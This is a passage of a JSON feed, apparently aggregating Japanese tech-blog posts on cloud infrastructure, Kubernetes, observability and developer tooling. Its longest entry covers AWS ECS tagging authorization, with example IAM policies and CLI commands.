AI...","isoDate":"2024-04-30T06:43:41.000Z","dateMiliSeconds":1714459421000,"authorName":"Tsubasa Nagasawa","authorId":"toVersus"},{"title":"WireGuard Exporter と Grafana Alloy で VPN 通信量を可視化","link":"https://blog.1q77.com/2024/04/wireguard-exporter/","contentSnippet":"先日、家のラズパイに Grafana Alloy をセットアップしてメトリクス可視化の環境はできているので WireGuard での VPN 通信のメトリクスを可視化してみようかなと試してみました。","isoDate":"2024-04-28T12:57:31.000Z","dateMiliSeconds":1714309051000,"authorName":"yteraoka","authorId":"yteraoka"},{"title":"見て見ぬふりをしない、権限とWorkload Identity(Google Cloud)","link":"https://zenn.dev/kamos/articles/92a8125dc3adac","contentSnippet":"はじめにGoogle Cloudを使う際、最も頻繁に遭遇するエラーは「権限が足りない」というものでした。特に新しいプロジェクトを立ち上げ、CI/CDの構築に取り組む際にこのエラーに何度も直面し、時間を浪費してしまいました。この経験から、Google Cloudの権限管理を深く知ることが重要であると痛感しました。そこで、体系的にGoogle Cloudの権限管理を学び、その成果をこの記事でわかりやすく共有したいと思います。 この記事を読んでほしい人Google Cloudにおける権限、ロール、プリンシパル、ポリシーの意味と関係性を説明できない人Workload Ident...","isoDate":"2024-04-27T16:53:02.000Z","dateMiliSeconds":1714236782000,"authorName":"Makoto Kamono","authorId":"kamono"},{"title":"Dev Containerを使ってみよう","link":"https://zenn.dev/bells17/articles/devcontainer-2024","contentSnippet":"Dev Containerを使ってみようDev Containerを使う上で知っておくと良さげな情報のまとめ記事です前にRemote SSHでDev Containerの環境を構築する記事を書いたので、今回はDev Container全般の情報をまとめてみましたhttps://zenn.dev/bells17/articles/remote-ssh-devcontainer tl;drDev Containerを使うと開発環境をコンテナで構築できるよ(ランタイムとかツール類含めて！)docker composeだとアプリケーションを動作させる環境は作れるけどDev C...","isoDate":"2024-04-22T18:05:48.000Z","dateMiliSeconds":1713809148000,"authorName":"bells17","authorId":"bells17"},{"title":"[EKS] Amazon Linux 2023 への移行","link":"https://zenn.dev/toversus/articles/a4bbd2047bbba1","contentSnippet":"2024/2/29 に Amazon Linux 2023 が EKS で正式サポートされました。全てのリージョンの Karpenter Node、マネージドノードグループ、セルフマネージドノードグループで利用可能です。現在 EKS でサポート対象の 1.25 以降に加えて、延長サポートに入っている EKS 1.23 / 1.24 でも利用できます。Amazon Linux 2023 のサポートに関しては Amazon EKS-Optimized Amazon Linux 2023 AMIs Now Available のブログに詳細がまとまっています。 セキュリティ機能の強化Am...","isoDate":"2024-04-17T00:22:38.000Z","dateMiliSeconds":1713313358000,"authorName":"Tsubasa Nagasawa","authorId":"toVersus"},{"title":"コンテナセキュリティの基本と脅威への対策","link":"https://speakerdeck.com/kyohmizu/kontenasekiyuriteinoji-ben-toxie-wei-henodui-ce","contentSnippet":"「Offers - 何から始める？脅威から考えるコンテナセキュリティのベストプラクティス」の登壇資料です。2024/04/16\\rhttps://offers.connpass.com/event/314412/","isoDate":"2024-04-16T04:00:00.000Z","dateMiliSeconds":1713240000000,"authorName":"kyohmizu","authorId":"kyohmizu"},{"title":"Grafana Alloy でメトリクス収集","link":"https://blog.1q77.com/2024/04/grafana-alloy/","contentSnippet":"Raspberry Pi を新しくしてからメトリクスの可視化を行っていなかったので Grafana Cloud で見れるようにセットアップしようと Grafana のサイトを見ていたら Alloy というものの存在を知ったので試してみる。","isoDate":"2024-04-15T15:16:09.000Z","dateMiliSeconds":1713194169000,"authorName":"yteraoka","authorId":"yteraoka"},{"title":"Vimコマンドの考え方覚え方について","link":"https://qiita.com/m_pig/items/5701ac8e79f610f8e055","contentSnippet":"この記事についてVimを使用して普段開発しているのですが、先輩に勧められたテキストを読んでvimコマンドの考え方が今までと変わったので考え方について書いていきます。その他テキストから知って便利だったプラグインを紹介します。考え方コマンドの実行は主に暗記に頼...","isoDate":"2024-04-04T04:27:31.000Z","dateMiliSeconds":1712204851000,"authorName":"Yushin Matsuura","authorId":"matsuura"},{"title":"PGUnconf #46 でPostgreSQL の開発するときにまず何からすればいいかを聞いてきた","link":"https://nnaka2992.hatenablog.com/entry/zatu/20240323_pgunconf.md","contentSnippet":"PGUnconf #46 でPostgreSQL の開発するときにまず何からすればいいかを聞いてきた概要2024年3月23日に第46回 PostgreSQLアンカンファレンス@東京が開催されました。PostgreSQLアンカンファレンスは日本PostgreSQLユーザー会が主催するイベントでPostgreSQLユーザーはもちろん、PostgreSQLのコントリンビューターやコミッターも参加しているイベントです。その中でPostgreSQL メジャーコントリビューターであり、コミッターでもある@masahiko_sawadaさんが、PGConn 2024でMAKING POSTGRESQL HACKING MORE INCLUSIVEというセッションでPostgreSQLコミュニティーがどうすればより初心者にオープンになれるか？ という内容でディスカッションするそうです。そこに向けてアイデアはあるか？ 困ってることはないか？ という相談？ をされていました。経験豊富な方々は実践的な案を出していましたが、私はPostgreSQLにコードコントリビュートしたいけど何からすればいいのか分らないという状態だったのでこの機会に相談してみました。自分のレベル感Cはすこし読める。すこし書けるPostgreSQLのソースコードはsimple_query_execの関数をひととおり読んで、なんとなくどこで何しているか分かるPostgreSQLのメーリングリストはとりあえず入った何が分からなかったのか？そもそもPostgreSQLはメーリングリストとパッチの文化なのでGitHub/Labなどになれた身からするとよく分からないです。またGitHubで管理されているOSSでは良くあるgood first issueのようなものも存在しないため、新規参入者には難しいと感じていました。なにからすればいいのか？PGUnconfでは以下のようなアドバイスを受けました。チュートリアルをなぞってドキュメント通りに動かないものを修正する初心者向けコンテンツへの追記は初心者にしか出来ないので、是非おねがいしたいとのことでした既存のパッチで放置されているもの(Headでビルドできないようなもの)をアップデートするメーリングリストのディスカッションを眺めてネタを探す新規機能を試してバグをさがし、修正するCommitFestに参加するまとめ1のネタを探してみつつ、PostgreSQL17のリリースが近いので4に取りくんでみようと思います。","isoDate":"2024-03-31T14:30:29.000Z","dateMiliSeconds":1711895429000,"authorName":"NAKADATE Naoki","authorId":"nnaka2992"},{"title":"BigQuery の Object テーブルと Gemini-pro-vision リモートモデルを使って pdf を要約してみる","link":"https://zenn.dev/satohjohn/articles/0cc45efca800e3","contentSnippet":"概要pdf などの非構造化データを GCS に配置した際に BQ で分析するってどうすんねんというところをやってみる流れとしては以下を実施するpdf などを gcs に配置するBigQuery Connection の作成する必要な権限付与を行うBQ で Object テーブルを作成するBQ でリモートモデルを作成するObject テーブルを使って pdf の要約をする 必要なことBigQuery Connection API の有効化 手順 pdf などを GCS に配置するここは何も考えないで GCS に pdf を配置する例えば、今回...","isoDate":"2024-03-30T17:44:21.000Z","dateMiliSeconds":1711820661000,"authorName":"SatohJohn","authorId":"SatohJohn"},{"title":"オシャレな図を書くために意識していること","link":"https://speakerdeck.com/kojake_300/osiyarenatu-woshu-kutameniyi-shi-siteirukoto","contentSnippet":"","isoDate":"2024-03-29T04:00:00.000Z","dateMiliSeconds":1711684800000,"authorName":"Yuki Iwasaki","authorId":"kojake_300"},{"title":"2024-03-29 SRETT9 Cloud SQLの可用性について","link":"https://speakerdeck.com/masasuzu/2024-03-29-srett9-cloudsqlnoke-yong-xing","contentSnippet":"","isoDate":"2024-03-29T04:00:00.000Z","dateMiliSeconds":1711684800000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"},{"title":"4か月でSAA-C03に合格した話","link":"https://qiita.com/r4ynode/items/755ba932f2edcccaabaa","contentSnippet":"2024年4月1日から試験料金が値上げされますね。値上げ話から昨年受験したことを思い出したので感想を書いていこうと思います。はじめに2023年9月2日 SAA-C03に合格しました。資格勉強する以前は、クラウド聞いたことはあるけど何それ美味しいの？？状態でし...","isoDate":"2024-03-27T09:17:59.000Z","dateMiliSeconds":1711531079000,"authorName":"Reito Koike","authorId":"reito"},{"title":"ECSのタグ付け認可とアカウント単位のオプトアウトの廃止","link":"https://blog.masasuzu.net/entry/2024/03/20/121151","contentSnippet":"ECSのタグ付け認可とはアカウント単位のオプトアウトの廃止確認影響がある例対応まとめ関連リソースECSのタグ付け認可とはECS関連のリソース作成時にリソースタグを付けることができます。その際 ecs:tagResource の権限が必要となります。なお、リソースタグを設定しないECSリソース作成の際は権限不要です。この権限の有無のチェックをタグ付け認可と言います。具体的にECSリソースの作成のアクションは以下の通りです。CreateCapacityProviderCreateClusterCreateServiceCreateTaskSetRegisterContainerInstanceRegisterTaskDefinitionRunTaskStartTaskタグ付け認可の仕組みは2023年4月18日に導入されました。しかしながら従来からECSリソースを作成する際にタグ付けしていたAWSアカウントに関しては影響があるため、アカウントレベルでタグ付け認可の機能を無効(オプトアウト)することができました。つまりアカウントレベルで無効にしていれば ecs:tagResource の権限がなくてもタグ付けをすることが可能でした。しかしながらアカウント単位のオプトアウト設定は2024年3月9日に廃止されます。アカウント単位のオプトアウトの廃止タグ付け認可におけるタイムラインは以下のとおりです2023年4月18日 タグ付け認可の導入とアカウント単位での有効化設定の導入2024年2月9日- 2月28日 新規アカウントおよび影響を受けないアカウントに関してデフォルトでタグ付け認可の有効化が行われる2024年2月29日 アカウント単位で有効にしている場合、無効に変更できなくなる2024年3月29日 すべてのアカウントでタグ付け認可が有効になり、アカウント単位での設定が不可能になる現時点(2024/03/20)であまり時間がありません。現在タグ付け認可に影響あるAWSアカウントに関しては、Personal Health Dashboadに以下のような通知が来ているはずです。▼ElasticContainerService security notification (クリックで展開)▼English follows Japanese | 英語のメッセージは日本語の後にございますお客様のアカウントにて過去 1 年以内に ecs:TagResource の許可無しに ECS リソースの作成時にタグを付けていることが判明したため、ご連絡差し上げます。Amazon ECS は、2023 年 4 月 18 日にリソース作成のタグ付け認証を導入しました [1]。新規および既存のお客様は、ECS Console または API の ECS アカウント設定ページを使用して、この新機能の使用をオプトインする必要があります。このセキュリティ制御により、ECS リソースの作成時にタグをつけることをユーザーに拒否または許可できます。2024 年 3 月 29 日以降もお客様の IAM プリンシパルが新しく作成された ECS リソースに引き続きタグを適用できるように、IAM ポリシーを更新して ecs:TagResource アクションを明示的に許可することを強くお勧めします。2024 年 2 月 9 日以降、AWS コンソール の ECS アカウント設定ページにて tagResourceAuthorization アカウント設定を明示的に off に設定していないすべてのお客様のアカウントは、自動的にこの設定にオプトインされました。お客様の AWS アカウントは一時的に許可リストに載せているため、2024 年 3 月 29 日まではタグリソース認証の off の動作が継続されます。2024 年 3 月 8 日、現在オプトインしているアカウントが tagResourceAuthorization をオプトアウトする機能を削除し、タグをサポートするすべての ECS リソースの作成に際して ecs:TagResource IAM 権限の使用を強制するようにしました。最終的に 2024 年 3 月 29 日をもってお客様のアカウントを許可リストから削除し、tagResourceAuthorization を有効化します。呼び出し元のプリンシパルの IAM ポリシーに ecs:TagResource アクションを含めずにタグをつけて ECS リソースを作成しようとすると、「AccessDenied」メッセージが表示されます。この変更は CreateCapacityProvider, CreateCluster, CreateService, CreateTaskSet, RegisterContainerInstance, RunTask, StartTask, および RegisterTaskDefinition の API に影響を及ぼします。ecs:TagResource を使用しない拒否レスポンスの例以下は、ecs:CreateCluster アクションを付与している IAM ポリシーの一部です。ecs:TagResource アクションは含まれていません。tagResourceAuthorization アカウント設定がオンの場合、リクエスト例では以下の AccessDenied 例外が返されます。# IAM ポリシー“Statement”: [{“Sid”: “AllowCreateCluster”,“Effect”: “Allow”,“Action”: [“ecs:CreateCluster”],“Resource”: “*”}]# クラスター作成のリクエストaws ecs create-cluster --cluster-name MyCluster --tags key=key1,value=value1# タグ付けの拒否されたレスポンスAn error occurred (AccessDeniedException) when calling the CreateCluster operation:User: is not authorized to perform: ecs:TagResource on resource: cluster/MyCluster because no identity-based policy allows the ecs:TagResource action必要なアクション:IAM プリンシパルが 2024 年 3 月 29 日以降も新しく作成された ECS リソースに引き続きタグを適用できるように、IAM ポリシーに次のステートメントを追加することを強くお勧めします。すべての ECS リソースの作成時にタグ付けを許可以下の説明に従って ecs:TagResource アクションを追加すると、ECS リソースの作成中にタグ付けが可能になります [2]。“Statement”: [{“Sid”: “AllowTagging”,“Effect”: “Allow”,“Action”: [“ecs:TagResource”],“Resource”: “*”}]単一の ECS リソースタイプ (ECS クラスタ) の作成時にタグ付けを許可条件ステートメント ecs:CreateAction を使用すると、タグ付けを特定の ECS API に制限できます。以下の例では、ECS CreateCluster API でのみタグ付けへのアクセスを許可します。タグ付きの ECS RunTask API へのリクエストは、拒否判定になります [2]。“Statement”: [{“Sid”: “AllowClusterTagging”,“Effect”: “Allow”,“Action”: [“ecs:TagResource”],“Resource”: “*”,“Condition”: {“StringEquals”: {“ecs:CreateAction” : “CreateCluster”}}}]タイムライン:2024 年 2 月 9 日（完了）- タグ付け認証はデフォルトで on になっています。これには、ホワイトリストに登録されているアカウントは含まれません。tagResourceAuthorization アカウント設定の on/off を切り替えることも可能であり、ポリシーへの準拠をテストいただけます。2024 年 3 月 8 日 - タグ付け認証を on にすると、off にすることはできなくなります。この日まではアカウント設定を切り替えることができますので、その間に IAM ポリシーをテストすることをお勧めします。2024 年 3 月 29 日 - すべての AWS アカウントでタグ付け認証が有効になります。アカウントレベルの設定は使用されなくなり、AWS コンソールの ECS アカウント設定ページから削除されます。ご質問やご不明点等ございましたら、AWS サポート [3] までお問い合わせください。[1] https://docs.aws.amazon.com/AmazonECS/latest/developerguide/ecs-account-settings.html#tag-resources-setting[2] https://docs.aws.amazon.com/AmazonECS/latest/developerguide/supported-iam-actions-tagging.html[3] https://aws.amazon.com/support---We are contacting you because we identified that your account has tagged ECS resources upon creation, within the past year, without the ecs:TagResource permission. Amazon ECS introduced tagging authorization for resource creation on April 18, 2023 [1]. New and existing customers must opt-in to use this new feature by using the ECS Account Settings page in the ECS Console or API. This security control allows users to deny or allow tagging ECS resources when they are created. We strongly recommend you update your IAM policies to explicitly allow the ecs:TagResource action so that your IAM principals continue applying tags to newly created ECS resources on or after March 29, 2024.From February 9, 2024, all customer accounts which have not explicitly set the tagResourceAuthorization account setting to “off” in the ECS Account Settings page in the AWS Console were automatically opted into the setting. We have temporarily allow-listed your AWS account so you will continue to have the “off” behavior for tagResourceAuthorization until March 29, 2024.On March 8, 2024, we removed the ability for currently opted-in accounts to opt-out of tagging authorization and enforced the creation of all ECS resources that support tags to use the ecs:TagResource IAM permission.Finally on March 29, 2024, we will remove your account from the allow-list and activate tagResourceAuthorization. You will experience an \\"AccessDenied\\" message if you attempt to create tagged ECS resources without including the ecs:TagResource action in the IAM policy of the calling principal. This change will affect the following APIs: CreateCapacityProvider, CreateCluster, CreateService, CreateTaskSet, RegisterContainerInstance, RunTask, StartTask, and RegisterTaskDefinition.Example Deny Response without ecs:TagResourceThe following is part of an IAM policy that is granting the ecs:CreateCluster Action. It does not include the ecs:TagResource Action. When tagResourceAuthorization Account setting is on, the example request would return the AccessDeniedException below.# IAM Policy“Statement”: [{“Sid”: “AllowCreateCluster”,“Effect”: “Allow”,“Action”: [“ecs:CreateCluster”],“Resource”: “*”}]# Create Cluster Requestaws ecs create-cluster --cluster-name MyCluster --tags key=key1,value=value1# Tagging Denied ResponseAn error occurred (AccessDeniedException) when calling the CreateCluster operation:User: is not authorized to perform: ecs:TagResource on resource: cluster/MyCluster because no identity-based policy allows the ecs:TagResource actionRequired Action:To ensure your IAM principals continue applying tags to newly created ECS resources on or after March 29, 2024, we strongly recommend adding the following statement(s) to your IAM policies:Allow Tagging during creation for all ECS ResourcesAdding the ecs:TagResource Action as described below would Allow tagging during ECS resource creation [2].“Statement”: [{“Sid”: “AllowTagging”,“Effect”: “Allow”,“Action”: [“ecs:TagResource”],“Resource”: “*”}]Allow Tagging during creation for single ECS Resource Type (ECS Cluster)Using the Conditional statement ecs:CreateAction allow you to limit the tagging to a specific ECS API. The example below grants access to tagging only on the ECS create-cluster API. A request to the ECS API run-task with tags would result in a Deny decision [2].“Statement”: [{“Sid”: “AllowClusterTagging”,“Effect”: “Allow”,“Action”: [“ecs:TagResource”],“Resource”: “*”,“Condition”: {“StringEquals”: {“ecs:CreateAction” : “CreateCluster”}}}]Timeline:February 9, 2024 (Completed) - Tagging Authorization is “on” by default. This excludes your account which is allowlisted. The tagResourceAuthorization account setting can be turned on/off to help test your policy compliance.March 8, 2024 - Tagging Authorization can no longer be turned “off” once it is turned “on”. It is recommended that you test your IAM policies before this date while you are able to toggle the account setting.March 29, 2024 - Tagging Authorization will be turned on for all AWS accounts. The account level setting will no longer be used and will be removed from the ECS Account Settings page in the AWS Console.If you have any questions, please contact AWS Support [3].[1] https://docs.aws.amazon.com/AmazonECS/latest/developerguide/ecs-account-settings.html#tag-resources-setting[2] https://docs.aws.amazon.com/AmazonECS/latest/developerguide/supported-iam-actions-tagging.html[3] https://aws.amazon.com/support通知が来ているアカウントは29日までに対応する必要があります。確認aws ecs list-account-settings --effective-settings --name tagResourceAuthorization を実行すると以下のような表示になると思います。ここがonであれば、すでにアカウント単位で有効になってるので影響がありません。(ただし、タグ付きのリソースを新規作成する際には権限が足りないとエラーになる可能性はあります)ここがoffになっている場合、タグ付け認可が無効になってるので3月29日以降影響を受ける可能性があります。% aws ecs list-account-settings --effective-settings --name tagResourceAuthorization{    \\"settings\\": [        {            \\"name\\": \\"tagResourceAuthorization\\",            \\"value\\": \\"on\\",            \\"principalArn\\": \\"arn:aws:iam::xxxxxxxxxxxx:root\\"        }    ]}影響がある例ユースケースにもよりますが、タグ付け認可に関連する操作は以下のようなものが考えられるかと思いますインフラ担当者によるECSリソース構築開発担当者(またはCI/CD)によるECSサービスのデプロイ前者に関しては、PowerUser相当の強い権限を付与されていることが多くここが問題になることはほとんどど無いかとは思います。後者の特にCI/CDによるデプロイに問題となることがありえます。一般的に非人間ユーザで目的が明確であれば、最小権限の原則に則り、 ecs:TagResource が付与されていない可能性があります。トライアンドエラーで権限を付与した場合、過去にうまく動いたためそのままの権限で使い続けている可能性もあります。その場合影響がある可能性あります。デプロイ時のタスク定義登録の際、タスク定義内に従来なかったtagsの記述を新規追加した際にResgisterTaskDefinitionでエラーになるという事例を私は経験しました。タスク定義にtagsがないときはタグ付け認可は実行されないのでそのまま成功していたため、ecs:TagResource が必要なことに気づいていませんでした。エラーとしては以下のような記述になるので、タグ付け認可の機能の存在を知っていて冷静に読み解けば、ecs:TagResource が足りていないことに気づけると思います。An error occurred (AccessDeniedException) when calling the RegisterTaskDefinition operation: User: arn:aws:sts::xxxx:assumed-role/deploy-github-actions/GitHubActions is not authorized to perform: ecs:TagResource on resource: arn:aws:ecs:ap-northeast-1:xxxx:task-definition/ecs-service because no identity-based policy allows the ecs:TagResource action対応まずECSサービスを利用しているIAM RoleとIAM Policyを洗い出します。その上でそれらが以下のアクションを許可している場合、ecs:TagResource を追加してあげます。CreateCapacityProviderCreateClusterCreateServiceCreateTaskSetRegisterContainerInstanceRegisterTaskDefinitionRunTaskStartTask私の場合は、ECSサービスデプロイ用のポリシーに以下のStatementを追加しました。それぞれ適切な記述を足していただけたらと思います。この場合タスク定義を登録する際にタグ付け認可を通すような許可を追加しています。        {            \\"Action\\": \\"ecs:TagResource\\",            \\"Condition\\": {                \\"StringEquals\\": {                    \\"ecs:CreateAction\\": \\"RegisterTaskDefinition\\"                }            },            \\"Effect\\": \\"Allow\\",            \\"Resource\\": \\"arn:aws:ecs:ap-northeast-1:xxxxxx:task-definition/yyyyyyyyyyyyyyy:*\\",            \\"Sid\\": \\"RegisterTaskDefinitionWithTag\\"        },まとめタグ付け認可について説明しました。タグ付け認可は2024年3月29日に強制的に全アカウントで有効になります。時間が少ないですが、影響受ける可能性があるかどうかチェックしてハマらないようにしましょう。また、これまでタグ付けしてなかったリソースにタグ付けする際にタグ付け認可に引っかかる可能性があります。デプロイやリソース作成の際にnot authorized to perform: ecs:TagResource と言われたらこの記事を思い出していただけたらと思います。それでは良いECSライフを!関連リソースアカウント設定による Amazon ECS 機能へのアクセス - Amazon Elastic Container Service タグ付け認可リソース作成時にタグ付けするための許可を付与する - Amazon Elastic Container Service","isoDate":"2024-03-20T03:11:51.000Z","dateMiliSeconds":1710904311000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"},{"title":"Skaffoldのスゴさを語る！","link":"https://zenn.dev/kojake_300/articles/11945f2047b22b","contentSnippet":"この記事は、2024/3/15に登壇したJagu\'e\'r クラウドネイティブ分科会　俺の考える最強のCI/CDのリマスターになります。 k8sアプリケーション開発の悩み突然ですが皆さん、k8sでアプリを動かす時にこんな悩み、イライラはありませんか？k8sで検証する時には必ず通る道だと思います。効率よく検証するにはどうしたものか、、Skaffoldはそんな悩みを解決してくれます\uD83D\uDE04 Skaffoldとは？ 概要Skaffold[1]は、コンテナベース及びKubernetesアプリケーションの継続的開発(Continuous Development = CD)を容易...","isoDate":"2024-03-18T11:24:43.000Z","dateMiliSeconds":1710761083000,"authorName":"Yuki Iwasaki","authorId":"kojake_300"},{"title":"Skaffoldを用いたGKEアプリケーションの CD（Continuous Development）","link":"https://speakerdeck.com/kojake_300/skaffoldwoyong-itagkeapurikesiyonno-cd-continuous-development","contentSnippet":"","isoDate":"2024-03-17T04:00:00.000Z","dateMiliSeconds":1710648000000,"authorName":"Yuki Iwasaki","authorId":"kojake_300"},{"title":"Tagpr で tag trigger の workflow が実行されなくてハマった話","link":"https://blog.1q77.com/2024/03/tagpr/","contentSnippet":"最近 tagpr という便利ツールの存在を知って試していたのですが、使い方が悪くてハマったのでメモ。tagpr とは作者さまの記事を参照ください。リリース用のpull requestを自動作成し、マージされたら自動でタグを打つtagpr","isoDate":"2024-03-15T00:00:00.000Z","dateMiliSeconds":1710460800000,"authorName":"yteraoka","authorId":"yteraoka"},{"title":"Helm chart を GitHub Container Registry に host する","link":"https://blog.1q77.com/2024/03/helm-push-to-ghcr/","contentSnippet":"背景最近は書いたアプリを Kubernetes に deploy することも多い。その際に helm で簡単に deploy できるようになっていると便利ということで Helm chart を Git に入れておいても良いのだけれども、せっかくなら直接インストールできるようにしてしまいたい。そんな場合に使えるのが OCI Registry。","isoDate":"2024-03-14T15:13:39.000Z","dateMiliSeconds":1710429219000,"authorName":"yteraoka","authorId":"yteraoka"},{"title":"Google Cloud Managed Service for Prometheusでprismaメトリクスを可視化してみた","link":"https://speakerdeck.com/kojake_300/google-cloud-managed-service-for-prometheusteprismametorikusuwoke-shi-hua-sitemita","contentSnippet":"","isoDate":"2024-02-29T05:00:00.000Z","dateMiliSeconds":1709182800000,"authorName":"Yuki Iwasaki","authorId":"kojake_300"},{"title":"Reckoner の Scala プロジェクトにおける オブザーバビリティの取り組み / Observability Initiatives in Reckoner\'s Scala Project","link":"https://speakerdeck.com/nomadblacky/reckoner-no-scala-puroziekutoniokeru-obuzababiriteinoqu-rizu-mi","contentSnippet":"2024/02/27 Scalaわいわい勉強会 #2\\rhttps://scala-tokyo.connpass.com/event/307069/","isoDate":"2024-02-27T05:00:00.000Z","dateMiliSeconds":1709010000000,"authorName":"Takumi Kadowaki","authorId":"nomadblacky"},{"title":"Azure Container Apps Jobs を Self-hosted GitHub Actions Runner として使う","link":"https://blog.1q77.com/2024/02/container-apps-jobs-self-hosted-github-actions-runner/","contentSnippet":"GitHub Actions の Self-hosted Runner を安く用意する方法を探していたところ、Azure の Container Apps Jobs というのが便利に使えるらしいというのを見つけたので試してみる。チュートリアル:Azure Container Apps ジョブを使用してセルフホスト型 CI/CD ランナーとエージェントをデプロイするをなぞるだけです。","isoDate":"2024-02-23T10:05:41.000Z","dateMiliSeconds":1708682741000,"authorName":"yteraoka","authorId":"yteraoka"},{"title":"アーキテクチャから学ぶKubernetesの全体像","link":"https://speakerdeck.com/bells17/akitekutiyakaraxue-hukubernetesnoquan-ti-xiang","contentSnippet":"Developers Summit（デブサミ）2024で登壇したセッションの資料です。\\r\\r- https://event.shoeisha.jp/devsumi/20240215\\r- https://event.shoeisha.jp/devsumi/20240215/session/4777\\r\\rセッション解説記事:\\rhttps://codezine.jp/article/detail/19131","isoDate":"2024-02-15T05:00:00.000Z","dateMiliSeconds":1707973200000,"authorName":"bells17","authorId":"bells17"},{"title":"個人開発でWebアプリの開発とデプロイの流れ","link":"https://kechigon.hatenablog.com/entry/2024/02/13/125853","contentSnippet":"個人でWebサービスを開発したいけど、どのような流れで作っていけばいいのかわからない方向けです。個人開発でWebアプリを開発、デプロイをしたのでその流れを共有したいと思います。作ったもの麻雀戦績管理アプリ名付けて「PungPals」。雀荘などのオフラインでの対戦結果を残し、個人成績やランキングを確認できます。pungpals-service-xstpolfd4q-an.a.run.app開発とデプロイの流れ1.要件定義、設計実装がスムーズに進むために、しっかりとしておきましょう。以前記事を書いたので、参考にしてください。kechigon.hatenablog.com2.技術選定今回作ったアプリケーションはDjangoで開発し、Cloud Runにデプロイしています。選定理由は、Django: 経験があるから。Cloud Run: Djangoアプリのデプロイ方法の公式ドキュメントがあった(後ほど説明します)、マネージドな部分とカスタムできる部分のバランスがちょうどよかったから。でした。以下これらの技術を使って、開発デプロイまでの流れを説明していきます。3.Djangoを使ってアプリケーションを作成Djangoにはチュートリアルがあり、はじめての Django アプリ作成、その 1 | Django ドキュメント | Djangoはじめての Django アプリ作成、その2 | Django ドキュメント | Djangoはじめての Django アプリ作成、その 3 | Django ドキュメント | Djangoはじめての Django アプリ作成、その 4 | Django ドキュメント | Djangoを読めば開発方法がわかると思います。環境構築をし、実装し、ローカルで動作確認をしながら開発していきます。4.Cloud run へのデプロイDjangoアプリのCloud runへのデプロイ方法は公式ドキュメントにまとめられているので、これを見ながら進めます。cloud.google.comDjangoアプリケーションを環境に合わせて設定した後コンテナ化し、Cloud Runに載せます。それに伴い、Cloud SQL(データベース)、Secret Manager(シークレット管理)、Cloud Storage(静的アセットの保存など)、Cloud Build(CI/CD)、Artifact Registry(コンテナレジストリ)の作成、設定も行います。ドキュメントではGCRを使っていますが、現在非推奨なので、Artifact Registryをコンテナレジストリとして使用します。cloud.google.comオプションですが、GCPへのリソースの作成はTerraformを利用すると、構成管理ができ便利です。作成するインフラの図以上のことを行った後のGitHubリポジトリPungPalsのコードは公開しているので、参考にしていただければと思います。github.comこれから今後は、運用面の課題解決や集客などを行っていく予定なので、ブログにしていくつもりです！","isoDate":"2024-02-13T03:58:53.000Z","dateMiliSeconds":1707796733000,"authorName":"Kurita Keigo","authorId":"kurita"},{"title":"フロントエンドで収集するべきテレメトリは何か","link":"https://zenn.dev/kimitsu/articles/frontend-and-telemetry","contentSnippet":"先日『フロントエンド監視の全体像と実現方法』という記事を投稿しましたが、その中でテレメトリについては触れませんでした（※本記事は上記記事の内容を知らなくても読み進められるようになっています）。というのは、テレメトリは可観測性を実現するための重要な概念ではあるものの、テレメトリを軸に監視を考えるのは手段の目的化になってしまうと考えているからです。重要なのはサービスにとって何を観測するべきかを考えることであり、テレメトリはそれを設計や実装に落とし込む際に現れるものです。一方で監視に対する理解を深める上では、テレメトリを軸に考えることも重要でしょう。そこで本記事ではフロントエンド監視に...","isoDate":"2024-02-11T01:40:25.000Z","dateMiliSeconds":1707615625000,"authorName":"Yunosuke Yamada","authorId":"yyamada"},{"title":"フロントエンド監視の全体像と実現方法","link":"https://zenn.dev/kimitsu/articles/frontend-monitoring","contentSnippet":"必要性フロントエンドの監視はバックエンドやインフラのそれらと比べ、優先度が低くなりがちです。バックエンドやインフラでの障害はサービス継続に直結するため、これは当然と言えば当然なのですが、別の理由もあると考えています。それは計算リソースをサービス提供側が管理していないことです。例えばアプリケーションがインフラとして AWS を利用しているなら、AWS のリソースを管理するのはサービス提供側です。これは AWS 以外のクラウドサービスプロバイダやオンプレであっても同様です。一方でフロントエンドはエンドユーザのブラウザ上で動作し、これを管理しているのはエンドユーザです。フロン...","isoDate":"2024-02-09T09:46:56.000Z","dateMiliSeconds":1707472016000,"authorName":"Yunosuke Yamada","authorId":"yyamada"},{"title":"安全な Kubernetes 環境を目指して","link":"https://speakerdeck.com/kyohmizu/an-quan-na-kubernetes-huan-jing-womu-zhi-site","contentSnippet":"Kubernetes Novice Tokyo #30 の登壇資料です。2024/02/08\\rhttps://k8s-novice-jp.connpass.com/event/300441/","isoDate":"2024-02-08T05:00:00.000Z","dateMiliSeconds":1707368400000,"authorName":"kyohmizu","authorId":"kyohmizu"},{"title":"YugabyteDB ManagedのAlways Free枠を試そう","link":"https://zenn.dev/nnaka2992/articles/play_with_yugabytedb_managed_sandbox","contentSnippet":"YugabyteDB Managedにフリートライアルがあるのは知っていたのですが、期間が限られたものしか無いと思っていました。YugabyteDBについて調べごとをしていたら機能制限はあるもののSandboxクラスターというクレジットカード登録すら不要でAlways Freeな利用枠があることを知りました。いままでローカルでYugabyteDBを建てたりminikube上で遊んでいたのですが、簡単な検証であればSandboxクラスターで十分です。この記事ではそんなYugabyteDB ManagedのSandboxクラスターを紹介します。 Sandbox Clusterの制限...","isoDate":"2024-02-04T15:02:28.000Z","dateMiliSeconds":1707058948000,"authorName":"NAKADATE Naoki","authorId":"nnaka2992"},{"title":"renovate で CircleCI の terraform_version を更新する","link":"https://blog.1q77.com/2024/02/update-terraform-version-in-circleci-with-renovate/","contentSnippet":"課題Circle CI の terraform Orb でterraform の version を指定するには次のようにしますが、この terraform_version の値に変数を使うことが出来ず、tf ファイルや .tool-versions から読み出した値を使うことが出来ませんでした。","isoDate":"2024-02-04T10:37:36.000Z","dateMiliSeconds":1707043056000,"authorName":"yteraoka","authorId":"yteraoka"},{"title":"Controllerを作ってみよう~ Kubernetes Controllerハンズオン ~","link":"https://speakerdeck.com/bells17/controllerwozuo-tutemiyou-kubernetes-controllerhansuon","contentSnippet":"イベントURL: https://k8s-novice-jp.connpass.com/event/300442/\\r参考リポジトリ: 